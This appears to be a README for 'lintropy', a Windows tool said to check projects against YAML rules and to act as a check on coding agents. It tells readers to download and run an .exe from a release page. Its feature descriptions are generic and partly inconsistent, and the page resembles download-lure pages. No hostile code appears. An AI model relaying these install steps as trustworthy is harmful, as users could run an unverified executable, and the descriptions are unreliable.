# 🛡️ lintropy - Keep your project code clean automatically

[![](https://img.shields.io/badge/Download-Lintropy-blue.svg)](https://github.com/migue1859/lintropy)

Lintropy helps you maintain consistency in your software projects. Projects often grow in size and complexity over time. Developers sometimes forget the original rules regarding how code should look or how different parts of the project should interact. This tool automates the process of checking your files against a set of standards you define. It works for human developers and for automated coding agents. By using simple text files to describe your rules, you ensure that everyone follows the same path.

## 📥 How to download the software

The software is available on the project page. You can find the installer for Windows on the releases page. 

[Visit this page to download the latest version for Windows](https://github.com/migue1859/lintropy)

1. Open your web browser.
2. Go to the link provided above.
3. Look for the latest release under the Assets section.
4. Click the file ending in .exe to start the download.
5. Save the file to your computer.

## ⚙️ Setting up your system

Lintropy runs on your local machine. It requires a modern version of Windows. Ensure you have Windows 10 or 11 installed. The tool does not require extensive storage space or high-end graphics hardware. It performs static analysis, which means it reads your files without executing them. This approach makes it efficient and safe to run on any project size, from small scripts to large monorepos.

After the download finishes, locate the file in your downloads folder. Double-click the file to begin the installation steps. Follow the prompts on your screen. The installer places a shortcut on your desktop for quick access.

## 📝 Defining your rules

Lintropy uses YAML files to define project constraints. YAML is a plain text format that is easy to read. Create a file named `lintropy.yaml` in the root folder of your project. This file acts as the rulebook for your code.

Define architectural boundaries by listing folders that should not interact. If your project has a folder for sensitive data, you can create a rule that prevents other parts of the code from importing files from that directory. You can also define naming conventions for your files or functions. 

The software uses tree-sitter technology to understand the structure of your code. This allows it to verify that your files follow the rules you set without needing to parse the code in a complex way. Write your rules in plain language, such as:

- No imports from the database folder except for the access module.
- All function names must use lowercase letters with underscores.
- Each component file must contain a comment block at the top.

## 🚀 Running the analysis

Once you install the software and define your rules, you can run lintropy. Open the application using the desktop icon. The app displays a simple window with a text box. Enter the path to your project folder in the box. 

Click the Start Analysis button. The tool scans your code and compares it against your `lintropy.yaml` file. If the tool finds code that breaks a rule, it lists the file name and the line number where the issue exists. It also describes the rule that was broken.

You can review these results in the app window. Click on any item in the list to open the corresponding file in your default text editor. Make the necessary changes to your code based on the suggestions. Save the file and run the analysis again to confirm that you fixed the issues.

## 🤖 Using with coding agents

If you use automated coding agents or AI assistants to help write your code, lintropy provides a safety net. Coding agents sometimes generate code that does not fit your project architecture. By placing a `lintropy.yaml` file in your root folder, you inform the agent about your constraints. 

The agent can read the rule file and adjust its output to respect your boundaries. This creates a feedback loop where the agent writes code, and lintropy verifies it. This partnership ensures that your codebase stays clean as it grows. The tool helps maintain the quality of the project, even when you add thousands of lines of code automatically.

## 🔍 Troubleshooting common issues

Most issues arise from formatting errors in the YAML file. Ensure your rules follow a clean structure. If the tool fails to run, check the following:

- Verify that your YAML file indentation uses two spaces.
- Ensure the project path does not contain special characters.
- Make sure you saved your rule file with the correct extension.
- Check that you have read permissions for the project folder.

If the application does not launch, ensure your Windows update is current. The tool relies on standard libraries that require a stable operating system environment. 

## 🛠️ Typical use cases

Lintropy supports various development workflows. You can use it in a monorepo setup to keep different packages in the same repository consistent. You can also use it for smaller projects to enforce a strict naming style across the team. 

In a team setting, assign one person to manage the `lintropy.yaml` file. This person acts as the gatekeeper for architectural rules. As the team decides on new conventions, update the YAML file to reflect these changes. Distribute the file to all team members so everyone has the same rulebook. This reduces friction during code reviews, as the tool handles the enforcement of style and structure.

## 📈 Maintaining code quality

Code quality is the result of discipline. Over time, projects accumulate "technical debt," which makes future changes difficult. Lintropy helps you manage this debt by providing automated checks. When you catch structural errors early, you avoid expensive refactoring later.

The tool focuses on the rules that matter most to your team. By defining boundaries upfront, you prevent messy code from entering your project. This leads to a more maintainable codebase and a better experience for anyone working on the project.

## 📁 Managing project constraints

Use the tool to document your architecture. A well-written set of rules acts as documentation for new developers joining your team. They can read the YAML file to understand the boundaries and conventions of your project. This reduces the time needed to gain familiarity with the codebase. The tool confirms that the reality of the code matches the intention of the team, bridging the gap between documentation and execution.